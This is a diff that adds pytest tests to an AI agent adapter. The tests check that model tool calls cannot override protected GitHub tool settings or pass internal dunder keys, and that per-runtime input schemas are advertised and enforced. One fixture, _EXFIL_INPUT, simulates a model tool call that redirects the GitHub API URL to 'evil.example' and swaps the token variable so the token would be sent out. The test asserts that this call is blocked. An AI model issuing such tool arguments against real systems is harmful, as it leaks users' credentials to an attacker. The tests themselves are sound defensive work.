@@ -14,11 +14,13 @@ from typing import Any
 import pytest
 from dap_runtimes.adapters._providers._base import ProviderError
 from dap_runtimes.adapters.agent import (
+    DEFAULT_INPUT_SCHEMA,
     AgentAdapter,
     AgentHaltError,
     BudgetExhaustedError,
     MaxTurnsExhaustedError,
 )
+from dap_runtimes.adapters.github import GithubAdapter
 from dap_runtimes.registry import create_default_registry
 from dap_types import HealthStatus, RuntimeKind, RuntimeResult, RuntimeTask
 
@@ -549,3 +551,143 @@ async def test_agent_gemini_budget_exhausted() -> None:
     assert result.structured["error_type"] == "BudgetExhaustedError"
     assert len(client.requests) == 3  # 0.00165 >= 0.0015 after turn 3
     assert result.cost_usd == pytest.approx(3 * 0.00055)
+
+
+# --- protected tool config and per-runtime input schemas (#1020) -----------------
+
+
+class _RecordingGithub(GithubAdapter):
+    """The real github adapter's schema; execute records the task and never calls out."""
+
+    def __init__(self) -> None:
+        super().__init__()
+        self.tasks: list[RuntimeTask] = []
+
+    async def execute(self, task: RuntimeTask, on_output: Any = None) -> RuntimeResult:
+        self.tasks.append(task)
+        return RuntimeResult(success=True, output='{"title": "Bug"}')
+
+
+_EXFIL_INPUT: dict[str, Any] = {
+    "op": "read_issue",
+    "repo": "o/r",
+    "issue": 1,
+    "api_url": "https://evil.example",
+    "token_env": "X",
+}
+
+
+async def test_agent_refuses_protected_github_keys() -> None:
+    tool = _RecordingGithub()
+    client = _FakeClient([_tool_use(1, _EXFIL_INPUT), _final("blocked")])
+
+    result = await AgentAdapter(tools={"github": tool}, client_factory=lambda: client).execute(
+        _task()
+    )
+
+    assert result.success, result.errors
+    # The adapter never saw the call, so the token could not leave.
+    assert [t.runtime_config for t in tool.tasks] == []
+    tool_result = client.requests[1]["messages"][-1]["content"][0]
+    assert tool_result["is_error"] is True
+    assert "api_url" in tool_result["content"]
+    assert "token_env" in tool_result["content"]
+    assert result.structured is not None
+    assert result.structured["tool_calls"][0]["success"] is False
+
+
+@pytest.mark.parametrize("use_github", [False, True])
+async def test_agent_refuses_dunder_keys_for_every_tool(use_github: bool) -> None:
+    tool: Any = _RecordingGithub() if use_github else _StubTool()
+    tool_input = {"op": "read_issue", "issue": 7, "__pipeline_state": {"x": 1}}
+    client = _FakeClient([_tool_use(1, tool_input), _final("blocked")])
+
+    result = await AgentAdapter(tools={"github": tool}, client_factory=lambda: client).execute(
+        _task()
+    )
+
+    assert result.success, result.errors
+    assert tool.tasks == []
+    tool_result = client.requests[1]["messages"][-1]["content"][0]
+    assert tool_result["is_error"] is True
+    assert "__pipeline_state" in tool_result["content"]
+
+
+async def test_agent_valid_github_call_still_dispatches_with_base_config() -> None:
+    tool = _RecordingGithub()
+    client = _FakeClient([_tool_use(1, {"op": "read_issue", "issue": 7}), _final("ok")])
+
+    result = await AgentAdapter(tools={"github": tool}, client_factory=lambda: client).execute(
+        _task()
+    )
+
+    assert result.success, result.errors
+    assert [t.runtime_config for t in tool.tasks] == [
+        {"repo": "acme/widgets", "op": "read_issue", "issue": 7}
+    ]
+
+
+@pytest.mark.parametrize(
+    ("provider", "model_id", "client_cls"),
+    [
+        ("anthropic", "claude-haiku-4-5", _FakeClient),
+        ("openai", "gpt-5-mini", _FakeOpenAIClient),
+        ("gemini", "gemini-2.5-flash", _FakeGeminiClient),
+    ],
+)
+async def test_agent_github_tool_advertises_adapter_schema(
+    provider: str, model_id: str, client_cls: type[_FakeClient]
+) -> None:
+    tool = _RecordingGithub()
+    client = client_cls([])
+    client._responses = [
+        {"anthropic": _final(), "openai": _oa_final(), "gemini": _gm_final()}[provider]
+    ]
+
+    result = await AgentAdapter(tools={"github": tool}, client_factory=lambda: client).execute(
+        _task(provider=provider, model_id=model_id)
+    )
+
+    assert result.success, result.errors
+    first = client.requests[0]
+    if provider == "anthropic":
+        schema = first["tools"][0]["input_schema"]
+    elif provider == "openai":
+        schema = first["tools"][0]["function"]["parameters"]
+    else:
+        schema = first["config"]["tools"][0]["function_declarations"][0]["parameters_json_schema"]
+    assert schema == GithubAdapter().tool_input_schema()
+    assert schema != DEFAULT_INPUT_SCHEMA
+
+
+async def test_agent_entry_input_schema_wins_over_adapter_schema() -> None:
+    tool = _RecordingGithub()
+    custom = {"type": "object", "properties": {"op": {"type": "string"}}}
+    client = _FakeClient([_final()])
+    tools = [{"runtime_id": "github", "config": {"repo": "acme/widgets"}, "input_schema": custom}]
+
+    result = await AgentAdapter(tools={"github": tool}, client_factory=lambda: client).execute(
+        _task(tools=tools)
+    )
+
+    assert result.success, result.errors
+    assert client.requests[0]["tools"][0]["input_schema"] == custom
+
+
+async def test_agent_entry_schema_closed_refuses_unlisted_keys() -> None:
+    tool = _StubTool()
+    custom = {
+        "type": "object",
+        "properties": {"op": {"type": "string"}},
+        "additionalProperties": False,
+    }
+    client = _FakeClient([_tool_use(1, {"op": "read_issue", "repo": "x/y"}), _final()])
+    tools = [{"runtime_id": "github", "input_schema": custom}]
+
+    result = await _adapter(client, tool).execute(_task(tools=tools))
+
+    assert result.success, result.errors
+    assert tool.tasks == []
+    tool_result = client.requests[1]["messages"][-1]["content"][0]
+    assert tool_result["is_error"] is True
+    assert "repo" in tool_result["content"]
